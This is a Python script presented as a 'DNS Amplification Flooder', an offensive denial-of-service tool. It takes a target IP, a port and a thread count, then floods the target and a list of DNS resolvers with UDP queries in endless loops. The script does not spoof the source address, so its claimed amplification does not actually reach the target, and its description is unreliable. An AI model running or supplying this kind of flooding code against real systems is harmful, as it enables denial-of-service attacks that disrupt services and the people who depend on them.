import random
import socket
import threading

# Banner
print("\033[91m")
print("###############################################")
print("#        Sheikh's DNS Amplification Flooder   #")
print("###############################################")
print("\033[0m")

# DNS Query Packet for amplification
dns_query = (
    b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77"
    b"\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01"
)

# Load DNS server IPs from a text file
def load_dns_servers(file_path):
    try:
        with open(file_path, 'r') as f:
            return [line.strip() for line in f.readlines() if line.strip()]
    except Exception as e:
        print(f"Error loading DNS servers: {e}")
        return []

def send_flood(target_ip, target_port, dns_server):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        while True:
            try:
                sock.sendto(dns_query, (dns_server, 53))  # Send DNS query to DNS server
                sock.sendto(dns_query, (target_ip, target_port))  # Send to target
                print(f"Sent DNS request to {dns_server} targeting {target_ip}")
            except Exception as e:
                print(f"Error: {e}")
                break

def start_flood(target_ip, target_port, threads, dns_servers):
    for _ in range(threads):
        dns_server = random.choice(dns_servers)
        thread = threading.Thread(target=send_flood, args=(target_ip, target_port, dns_server))
        thread.start()

if __name__ == "__main__":
    # Load DNS servers from text file
    dns_file = input("Enter the path to DNS servers file: ")
    dns_servers = load_dns_servers(dns_file)

    if not dns_servers:
        print("No DNS servers loaded. Exiting.")
    else:
        target_ip = input("Enter the target IP: ")
        target_port = int(input("Enter the target port: "))
        threads = int(input("Enter the number of threads: "))
        
        start_flood(target_ip, target_port, threads, dns_servers)
